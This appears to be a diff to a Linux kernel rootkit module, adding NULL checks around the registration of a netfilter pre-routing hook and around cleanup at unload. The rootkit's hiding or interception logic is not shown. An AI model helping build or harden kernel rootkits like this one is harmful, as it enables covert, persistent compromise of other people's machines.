@@ -20,11 +20,14 @@ static struct nf_hook_ops nfho = {
 
 static int __init rootkit_init(void) {
   printk(KERN_INFO "%i\n", current->pid);
+
   nfho.hooknum = NF_INET_PRE_ROUTING; 
   nfho.priv = init_search_map();
-  fill_search_dict((search_map_t *)nfho.priv);
 
-  nf_register_net_hook(&init_net, &nfho);
+  if (nfho.priv != NULL) {
+    fill_search_dict((search_map_t *)nfho.priv);
+    nf_register_net_hook(&init_net, &nfho);
+  }
 
   // success = success && my_func(...)
   printk(KERN_INFO "Rootkit has been loaded\n");
@@ -56,13 +59,17 @@ static int __init rootkit_init(void) {
 }
 
 static void __exit rootkit_exit(void) {
-   search_map_t *map = (search_map_t *)nfho.priv;
+  search_map_t *map;
+  
+  if (nfho.priv != NULL) {
+    map = (search_map_t *)nfho.priv;
 
-   free_search_map(map);
-   nf_unregister_net_hook(&init_net, &nfho);
+    free_search_map(map);
+    nf_unregister_net_hook(&init_net, &nfho);
+  }
 
-   fh_remove_hook(f_hook[0]);
-   printk(KERN_INFO "Rootkit has been unloaded\n");
+  fh_remove_hook(f_hook[0]);
+  printk(KERN_INFO "Rootkit has been unloaded\n");
 }
 
 module_init(rootkit_init);
